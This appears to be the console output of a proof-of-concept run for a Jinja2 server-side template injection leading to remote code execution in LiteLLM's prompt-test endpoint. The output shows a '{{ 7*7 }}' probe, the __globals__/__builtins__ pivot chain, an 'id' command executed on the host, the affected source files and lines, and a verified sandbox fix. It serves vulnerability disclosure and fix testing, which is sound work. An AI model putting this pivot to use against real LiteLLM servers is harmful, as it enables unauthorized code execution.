=== Scenario A ===
Exit code: 1
Output:
[96m[1m╔══════════════════════════════════════════════════════════╗
║  LiteLLM SSTI → RCE  |  /prompts/test  |  v1.82.6        ║
║  CVE candidate — distinct from CVE-2024-2952              ║
╚══════════════════════════════════════════════════════════╝[0m

[91m[-] jinja2 not installed. Run: pip install jinja2[0m

=== Scenario B ===
Exit code: 0
Output:
[96m[1m╔══════════════════════════════════════════════════════════╗
║  LiteLLM SSTI → RCE  |  /prompts/test  |  v1.82.6        ║
║  CVE candidate — distinct from CVE-2024-2952              ║
╚══════════════════════════════════════════════════════════╝[0m

[1m[1/3] Arithmetic evaluation check[0m
      Payload : {{ 7*7 }}
      Result  : [92m49 ✓  — Jinja2 executes template expressions[0m

[1m[2/3] Remote Code Execution — vulnerable environment[0m
      Source  : litellm/integrations/dotprompt/prompt_manager.py:62
      Pivot   : warnings.catch_warnings.__init__.__globals__['__builtins__']
      Command : id
      Output  : [91m[1muid=501(rodion) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae),701(com.apple.sharepoint.group.1)[0m
      Status  : [91m[VULNERABLE] RCE confirmed ✗[0m

[1m[3/3] Fix verification — ImmutableSandboxedEnvironment[0m
      Same payload, sandboxed environment
      Output  : Blocked with exception: SecurityError: access to attribute '__class__' of 'str' object is unsafe.
      Status  : [92m[FIXED] Sandbox blocks the payload ✓[0m

=== Scenario C ===
Exit code: 0
Output:
────────────────────────────────────────────────────────────
[91m[1mRESULT: VULNERABLE — RCE via Jinja2 SSTI confirmed[0m
Fix   : replace Environment with ImmutableSandboxedEnvironment
Files : litellm/integrations/dotprompt/prompt_manager.py:62
        litellm/integrations/gitlab/gitlab_prompt_manager.py:93
        litellm/integrations/arize/arize_phoenix_prompt_manager.py:77
        litellm/integrations/bitbucket/bitbucket_prompt_manager.py:77

=== Capture check ===
CAPTURE_PORT: N/A
CAPTURE_URL: N/A
Запросов захвачено: N/A
